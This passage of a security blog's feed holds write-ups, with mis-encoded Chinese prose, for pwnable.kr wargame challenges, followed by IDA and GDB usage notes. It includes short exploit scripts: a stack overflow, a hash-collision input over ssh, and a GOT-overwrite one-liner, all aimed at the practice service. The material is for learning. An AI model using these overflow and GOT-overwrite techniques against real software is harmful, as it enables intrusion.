    <content type="html"><![CDATA[<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><ul><li><p>é¢˜ç›®æè¿°ã€‚</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603151159958.png" alt="image-20200603151159958"></p><a id="more"></a></li><li><p>é€šè¿‡sshè¿æ¥åï¼Œæœ‰3ä¸ªæ–‡ä»¶ï¼Œflagæ²¡æœ‰æƒé™æŸ¥çœ‹ï¼Œé‚£å°±çœ‹ fd.c</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603151520348.png" alt="image-20200603151520348"></p></li><li><p>ç”±äºreadå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ0ï¼šæ ‡å‡†è¾“å…¥ï¼›1ï¼šæ ‡å‡†è¾“å‡ºï¼›2ï¼šæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚é‚£è¿™é‡Œåªè¦æ ·fdç­‰äº0å°±å¥½äº†ã€‚</p></li><li><p>ç›´æ¥è®©è¾“å…¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 4,660(0x1234)ï¼Œæ¥ç€å†è¾“å…¥ LETMEWIN å¾—åˆ°flagã€‚</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603152007549.png" alt="image-20200603152007549"></p></li></ul><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><blockquote><p>å­¦ä¹ äº†æ ˆæº¢å‡ºååšè¿™ä¸ªé¢˜æ­£åˆé€‚</p></blockquote><ul><li><p>å¾—åˆ°é¢˜ç›®çš„elfæ–‡ä»¶åidaæ‰“å¼€ã€‚</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603152328450.png" alt="image-20200603152328450"></p></li><li><p>å†åˆ©ç”¨idaä¸­å¾ˆå¥½çš„æ ˆæ˜¾ç¤ºï¼Œè®¡ç®—å¾—åˆ°éœ€è¦å¡«å……å¤§å° 0x34 ã€‚</p></li><li><p>å†™pyè„šæœ¬ï¼Œæ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x34</span>*<span class="string">'a'</span> + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(message)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603152657713.png" alt="image-20200603152657713"></p></li><li><p><strong>æ€»ç»“ï¼šä»åŸºç¡€çš„æº¢å‡ºå¼€å§‹ï¼Œæ…¢æ…¢è¿›æ­¥ã€‚</strong></p></li></ul><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><ul><li><p>é¢˜ç›®æè¿°ã€‚</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200605090406828.png" alt="image-20200605090406828"></p></li><li><p>sshè¿æ¥åå‘ç°å°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥20ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç„¶åè½¬åŒ–ä¸º5ä¸ª4å­—èŠ‚æ•°æ®çš„å€¼ç›¸åŠ ä¸º0x21DD09ECã€‚</p></li><li><p>é‚£å°±ç›´æ¥å‡‘äº†ï¼Œå¼€å§‹ç›´æ¥æƒ³çš„æ˜¯è¾“å…¥16ä¸ª0åŠ ä¸€ä¸ªåŸæ•°æ®ï¼Œä½†å­—ç¬¦ä¸²è®¡ç®—é•¿åº¦æ—¶å°±ä¼šè¿‡ä¸äº†ã€‚é‚£å‡‘å¾—æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œåªæ˜¯æ€æ ·å°†ä¸å¯æ‰“å°å­—ç¬¦è¾“å…¥ç»ˆç«¯ï¼ŒçŸ¥é“å¯ä»¥ä½¿ç”¨pythonçš„å•è¡Œæ‰§è¡Œè„šæœ¬å‘¢ -cã€‚</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200605090938145.png" alt="image-20200605090938145"></p></li><li><p>å¦å¤–å…¶å®ä¸€ç›´æƒ³ç”¨è„šæœ¬ç›´æ¥å®ç°ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œç½‘ä¸Šæœç„¶æœ‰ï¼Œå­¦ä¹ äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span> + p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'col'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">p.connected()</span><br><span class="line"></span><br><span class="line">p1 = p.process(argv=[<span class="string">'col'</span>, s], executable=<span class="string">'./col'</span>)</span><br><span class="line"><span class="keyword">print</span> p1.recv()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200605092003637.png" alt="image-20200605092003637"></p></li><li><p><strong>æ€»ç»“ï¼š1.åˆ©ç”¨pythonå•è¡Œè„šæœ¬è¾“å…¥ä¸æ‰“å°å­—ç¬¦æ•°æ®ã€‚2.åˆ©ç”¨è„šæœ¬å¯¹sshè¿æ¥å¹¶äº¤äº’çš„æ–¹æ³•ã€‚3.å“ˆå¸Œç¢°æ’çš„æ¦‚å¿µã€‚</strong></p></li></ul><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><ul><li>æŸ¥çœ‹ä¿æŠ¤çš„æ—¶å€™å‘ç°äº†upxå£³ï¼Œè„±å£³åè½½å…¥idaå³å¯å‘ç°flagã€‚</li><li>æ€»ç»“ï¼šæ— ã€‚</li></ul><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><blockquote><p>åˆ©ç”¨scanf()å‡½æ•°ä¸­æ²¡åŠ å–å€ç¬¦&amp;å­˜åœ¨çš„æ¼æ´ï¼Œè¦†å†™gotè¡¨æ¥è¾¾åˆ°æ§åˆ¶ç¨‹åºèµ°å‘çš„ç›®çš„ã€‚</p></blockquote><ul><li><p>é¢˜ç›®æè¿°ã€‚</p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608181103998.png" alt="image-20200608181103998"></p></li><li><p>è¿æ¥åæŸ¥çœ‹passcode.cæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°scanf()æ˜¯æ²¡æœ‰åŠ å–åœ°å€ç¬¦çš„ï¼Œæƒ³é€šè¿‡è¾“å…¥è¾¾åˆ°ç›®çš„è‚¯å®šä¼šæŠ¥é”™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å†çœ‹åˆ°welcomeï¼ˆï¼‰å‡½æ•°ï¼Œscanf(â€œ%100sâ€, name)å¯¹è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œæƒ³é€šè¿‡æº¢å‡ºæ˜¯ä¸è¡Œäº†ã€‚</p></li><li><p>æ—¢ç„¶ç¨‹åºå‡ºäº†é—®é¢˜æ˜¯æ²¡åŠ å–å€ç¬¦ï¼Œé‚£çªç ´å£è‚¯å®šå°±åœ¨å“ªé‡Œã€‚åˆæ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡åˆ°çš„æ¼æ´ç±»å‹ï¼Œç”±äºscanf(â€œ%dâ€, passcode1)ä¸­passcode1æ²¡åŠ å–åœ°å€ç¬¦ï¼Œå°†ä¼šæŠŠpasscode1æœ¬èº«çš„å€¼ä½œä¸ºåœ°å€ç„¶åå‘å…¶å†™å…¥æ•°æ®ã€‚å¹¶ä¸”è¿™ä¸ªpasscode1æ²¡æœ‰åˆå§‹åŒ–ï¼Œæ‰€ä»¥å®ƒçš„é»˜è®¤çš„å€¼å°†æ˜¯ä¸Šæ¬¡æ ˆä¸­ç•™ä¸‹æ¥çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ä¸Šæ¬¡å‘æ ˆä¸­å†™çš„æ•°æ®ï¼Œä½¿scanfï¼ˆï¼‰ä¸­çš„åœ°å€æ˜¯æˆ‘ä»¬å‘è¾“å…¥æ•°æ®çš„åœ°å€ã€‚</p></li></ul><blockquote><p>çŸ¥è¯†ç‚¹ï¼šåœ¨welcomeï¼ˆï¼‰å‡½æ•°ç»“æŸåï¼Œè™½ç„¶å®ƒä¼š<strong>push esp, ebpï¼›pop ebpï¼›ret</strong>è¿›è¡Œä¸€ä¸ªå †æ ˆå¹³è¡¡ï¼Œä½†æ˜¯åªæ˜¯æ”¹å˜äº†espå¯„å­˜å™¨çš„å€¼ï¼Œæ ˆä¸­çš„å†…å®¹æ²¡æœ‰è¿›è¡Œæ¸…ç†ï¼Œå¦‚æœä¸‹æ¬¡ä½¿ç”¨åŒä¸€ä¸ªæ ˆå®šä¹‰äº†å˜é‡ä½†æ²¡æœ‰èµ‹åˆå€¼ï¼Œé‚£å®ƒçš„åˆå§‹å€¼å°†æ˜¯ä¸Šæ¬¡æ ˆä¸­çš„ã€‚</p></blockquote><ul><li><p>ç”±äºgotè¡¨æ˜¯å¯ä»¥é‡å†™çš„ï¼Œå®ƒè®°å½•ç€æˆ‘ä»¬è¦æ‰§è¡Œå‡½æ•°çš„åœ°å€ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å°†ä¸‹æ¬¡è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€æ”¹æˆæˆ‘ä»¬æƒ³è¦å®ƒæ‰§è¡Œçš„å‡½æ•°åœ°å€ã€‚é€šè¿‡<strong>objdump -R passcode</strong>æŸ¥çœ‹gotè¡¨ã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¦æ”¹å†™å‡½æ•°åœ¨gotè¡¨ä¸­åœ°å€ä¸º  <strong>0x0804a004</strong></p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608182629397.png" alt="image-20200608182629397"></p></li><li><p>æ‰¾æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°çš„åœ°å€ã€‚ä½¿ç”¨<strong>objdump -d passcode</strong>æŸ¥çœ‹åæ±‡ç¼–ã€‚æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œå‡½æ•°åœ°å€ï¼š<strong>0x080485e3</strong></p><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608183049831.png" alt="image-20200608183049831"></p></li><li><p>åœ°å€æ‰¾åˆ°åï¼Œå¯»æ‰¾ç¬¬ä¸€æ¬¡welcome()å‡½æ•°ä¸­è¾“å…¥çš„å­—ç¬¦ä¸²çš„å“ªä¸€éƒ¨åˆ†ä¼šæ˜¯åé¢login()å‡½æ•°çš„ç¬¬ä¸€ä¸ªå˜é‡çš„å€¼ã€‚å…¶å®å¾ˆç®€å•ï¼Œ2ä¸ªå‡½æ•°æ˜¯åŒä¸€ä¸ªebpï¼Œç¬¬ä¸€ä¸ªå‡½æ•°è¾“å…¥çš„æœ€å4ä¸ªå­—èŠ‚æ•°æ®å°†æ˜¯ç¬¬äºŒä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå˜é‡çš„4ä¸ªå­—èŠ‚æ•°æ®ã€‚ï¼ˆè§£é‡Šèµ·æ¥æœ‰ç‚¹æŠ½è±¡ï¼Œç†è§£äº†å°±å¾ˆç®€å•ï¼‰</p></li><li><p>æœ€åæ„é€ å­—ç¬¦ä¸²ï¼Œæ”»å‡»ã€‚ç”±äºç™»å½•åˆ°è¿œç¨‹ç»ˆç«¯é‡Œæ²¡æœ‰æ‰§è¡Œå’Œå†™è„šæœ¬çš„æƒé™ï¼Œç›´æ¥ä½¿ç”¨pythonä¸ç®¡é“å‘½ä»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*96 + '\x04\xa0\x04\x08' + '134514147'"</span> | ./passcode</span><br></pre></td></tr></table></figure><p><img src="/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200608184738940.png" alt="image-20200608184738940"></p></li><li><p><strong>æ€»ç»“ï¼š1.2ä¸ªå‘½ä»¤çš„å­¦ä¹  objdump -R æ–‡ä»¶åï¼ˆæŸ¥çœ‹gotè¡¨ï¼‰ ä¸ objdump -d æ–‡ä»¶åï¼ˆæŸ¥çœ‹åæ±‡ç¼–ï¼‰ã€‚2.è¦†å†™gotçš„æ”»å‡»ã€‚</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;fd&quot;&gt;&lt;a href=&quot;#fd&quot; class=&quot;headerlink&quot; title=&quot;fd&quot;&gt;&lt;/a&gt;fd&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;é¢˜ç›®æè¿°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/image-20200603151159958.png&quot; alt=&quot;image-20200603151159958&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>å·¥å…·ä½¿ç”¨æ€»ç»“</title>
    <link href="https://www.bxnop.cn/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>https://www.bxnop.cn/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-02T02:36:00.000Z</published>
    <updated>2020-06-04T10:08:27.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDAå®ç”¨å¿«æ·é”®"><a href="#IDAå®ç”¨å¿«æ·é”®" class="headerlink" title="IDAå®ç”¨å¿«æ·é”®"></a>IDAå®ç”¨å¿«æ·é”®</h2><ul><li>ç©ºæ ¼ï¼šGraph overview ä¸ Text view ä¹‹é—´ç›¸å…³åˆ‡æ¢</li><li>tapï¼šä¼ªä»£ç ä¸æ±‡ç¼–ä»£ç å¿«é€Ÿåˆ‡æ¢</li><li>alt+tï¼šæœç´¢å­—ç¬¦ä¸²</li><li>shift+eï¼šå°†æ•°æ®ä»¥æŒ‡ä»¤æ–¹å¼æå–å‡ºæ¥</li><li>ctrl+sï¼šæŸ¥çœ‹ç¨‹åºå„ä¸ªæ®µçš„æƒ…å†µ</li><li>uï¼šå–æ¶ˆå®šä¹‰ï¼›aï¼šæ•°æ®è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</li></ul><a id="more"></a><h2 id="GDBè„šæœ¬çš„ä½¿ç”¨"><a href="#GDBè„šæœ¬çš„ä½¿ç”¨" class="headerlink" title="GDBè„šæœ¬çš„ä½¿ç”¨"></a>GDBè„šæœ¬çš„ä½¿ç”¨</h2><ol><li><p>æ‰§è¡Œgdbè„šæœ¬æœ‰2ä¸­åæ–¹å¼ï¼Œä¸€ï¼šç›´æ¥è¾“å…¥defienå‘½ä»¤ï¼Œè¾“å…¥æŒ‡ä»¤ï¼Œæœ€åæ‰§è¡Œã€‚äºŒï¼šå•ç‹¬å†™æˆä¸€ä¸ªè„šæœ¬æ–‡ä»¶ä½¿ç”¨ source æ¥æ‰§è¡Œã€‚</p></li><li><p>gdbè„šæœ¬ä¸­çš„ æŸ¥çœ‹å†…å­˜å†…å®¹çš„æ–¹æ³•ï¼šx/&lt;n/f/u&gt; <addr>     nã€fã€uæ˜¯å¯é€‰çš„å‚æ•°ã€‚</addr></p><p>nï¼šæ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œfï¼šè¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå…¶ä¸­ï¼šsï¼šå­—ç¬¦ä¸²æ˜¾ç¤ºï¼Œxï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œdï¼šæŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡</p><p>uï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ï¼Œtï¼šæŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œ oï¼šæŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œcï¼šæŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>æœ€åçš„uè¡¨ç¤ºæ¯ä¸ªå•å…ƒçš„å¤§å°ï¼Œå…¶ä¸­ï¼šbè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­— èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ã€‚</p><p>å¦‚ï¼š x/127xb  è¡¨ç¤ºå°† 127ä¸ªçš„å•å­—èŠ‚å•å…ƒçš„æ•°æ®æŒ‰16è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå‡ºæ¥ã€‚</p></li><li><p>è„šæœ¬ä¸­çš„ç©ºæ ¼è¦æ±‚ååˆ†ä¸¥æ ¼ã€‚</p></li></ol><h2 id="GDBå¸¸ç”¨å‘½ä»¤"><a href="#GDBå¸¸ç”¨å‘½ä»¤" class="headerlink" title="GDBå¸¸ç”¨å‘½ä»¤"></a>GDBå¸¸ç”¨å‘½ä»¤</h2><ul><li>layout+åˆ¶å®šæ˜¾ç¤ºå†…å®¹ï¼šç”¨äºå¯¹æˆ‘ä»¬è¦æ˜¾ç¤ºçš„å†…å®¹è¿›è¡Œåˆ†ä¸€ä¸ªçª—å£æ˜¾ç¤ºï¼Œè¾¾åˆ°ä¸€è¾¹æ‰§è¡Œä¸€è¾¹æ˜¾ç¤ºï¼Œå¦‚ layout asm</li><li>rï¼šå¼€å§‹è¿è¡Œï¼›cï¼šç»§ç»­è¿è¡Œï¼›siï¼šå•æ­¥æ­¥å…¥ï¼›nï¼šå•æ­¥æ­¥è¿‡ï¼›</li><li>disassemble mainï¼šæŸ¥çœ‹mainå‡½æ•°ï¼›x/2wx$espï¼šä»¥16è¿›åˆ¶æŸ¥çœ‹$espåœ°å€å¤„2ä¸ªå•ä½çš„å†…å®¹ï¼Œæ¯ä¸ªå•ä½4ä¸ªå­—èŠ‚ï¼ˆä¸Šé¢æœ‰æ€»ç»“ï¼‰</li><li>i rï¼šæŸ¥çœ‹å¯„å­˜å™¨çš„å€¼ï¼›</li><li>startiï¼šå¯ä»¥å…ˆå°†ç¨‹åºæ‰“å¼€ï¼Œä½†æ˜¯ä¸è¿è¡Œã€‚</li></ul><h2 id="IDAä¸­è¿è¡Œè„šæœ¬-idc-python"><a href="#IDAä¸­è¿è¡Œè„šæœ¬-idc-python" class="headerlink" title="IDAä¸­è¿è¡Œè„šæœ¬(idc python)"></a>IDAä¸­è¿è¡Œè„šæœ¬(idc python)</h2><h3 id="idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€"><a href="#idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€" class="headerlink" title="idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€"></a>idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€</h3><blockquote><p>è¿è¡Œè„šæœ¬ alt+F7ï¼›å•è¡Œæ‰§è¡Œpython ctrl+F3ï¼›æŸ¥çœ‹æœ€è¿‘è„šæœ¬æ–‡ä»¶ï¼šalt+F9</p></blockquote><ol><li><p>æ‰§è¡Œæ–¹æ³•ï¼šä½¿ç”¨shift+F2å¿«æ·é”®ï¼Œè¾“å…¥è¯­å¥å runï¼›æˆ–è€…ç›´æ¥ï¼ˆalt+F7ï¼‰æ·»åŠ  scriptï¼Œç„¶åæ‰§è¡Œã€‚</p></li><li><p>idcä¸­çš„è¯­æ³•å¤§å¤šä¸Cè¯­è¨€ç±»ä¼¼ã€‚è¿™é‡Œæ€»ç»“ä¸€äº›ç‰¹æ®Šçš„ã€‚</p><ul><li><p>messageä¸Cè¯­è¨€printf ç”¨æ³•ç›¸åŒã€‚</p></li><li><p>idcä¸­çš„å˜é‡éƒ½å®šä¹‰ä¸ºï¼šauto å˜é‡åï¼›å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥ç”¨ + å·è¿æ¥ï¼ˆauto s = â€œidaâ€ + â€œidcâ€;ï¼‰ï¼›æ”¯æŒåˆ‡ç‰‡æ“ä½œã€‚</p></li><li><p>æ¡ä»¶è¡¨è¾¾å¼ä¸­switchä¸æ”¯æŒã€‚</p></li><li><p>idcä¸­å‡½æ•°ä¸éœ€è¦æŒ‡æ˜ç±»å‹ï¼Œä½†å¿…é¡»éƒ½å®šä¹‰ä¸ºé™æ€ï¼ˆstatic main(){ }ï¼‰ã€‚</p></li><li><p>idcä¸­çš„æ•°ç»„ã€‚</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144349211.png" alt="image-20200602144349211"></p></li><li><p>idcå¸¸ç”¨çš„å‡½æ•°</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144323138.png" alt="image-20200602144323138"></p></li><li><p>å­—ç¬¦ä¸²æ“ä½œå‡½æ•°</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144745372.png" alt="image-20200602144745372"></p></li><li><p>æ•°æ®äº¤å‰å¼•ç”¨å‡½æ•°</p><p><img src="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200602144841498.png" alt="image-20200602144841498"></p></li></ul></li></ol><h3 id="Pythonè„šæœ¬"><a href="#Pythonè„šæœ¬" class="headerlink" title="Pythonè„šæœ¬"></a>Pythonè„šæœ¬</h3><ul><li>æ‰§è¡Œæ–¹æ³•ä¸idcè„šæœ¬ç±»ä¼¼ï¼Œè¯­è¨€ä¸åŒè€Œå·²ã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;IDAå®ç”¨å¿«æ·é”®&quot;&gt;&lt;a href=&quot;#IDAå®ç”¨å¿«æ·é”®&quot; class=&quot;headerlink&quot; title=&quot;IDAå®ç”¨å¿«æ·é”®&quot;&gt;&lt;/a&gt;IDAå®ç”¨å¿«æ·é”®&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ç©ºæ ¼ï¼šGraph overview ä¸ Text view ä¹‹é—´ç›¸å…³åˆ‡æ¢&lt;/li&gt;
&lt;li&gt;tapï¼šä¼ªä»£ç ä¸æ±‡ç¼–ä»£ç å¿«é€Ÿåˆ‡æ¢&lt;/li&gt;
&lt;li&gt;alt+tï¼šæœç´¢å­—ç¬¦ä¸²&lt;/li&gt;
&lt;li&gt;shift+eï¼šå°†æ•°æ®ä»¥æŒ‡ä»¤æ–¹å¼æå–å‡ºæ¥&lt;/li&gt;
&lt;li&gt;ctrl+sï¼šæŸ¥çœ‹ç¨‹åºå„ä¸ªæ®µçš„æƒ…å†µ&lt;/li&gt;
&lt;li&gt;uï¼šå–æ¶ˆå®šä¹‰ï¼›aï¼šæ•°æ®è½¬åŒ–ä¸ºå­—ç¬¦ä¸²&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="å·¥å…·" scheme="https://www.Bxnop.cn/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>PEå­¦ä¹ </title>
    <link href="https://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-30T08:14:50.000Z</published>
    <updated>2020-06-09T09:39:57.196Z</updated>
    
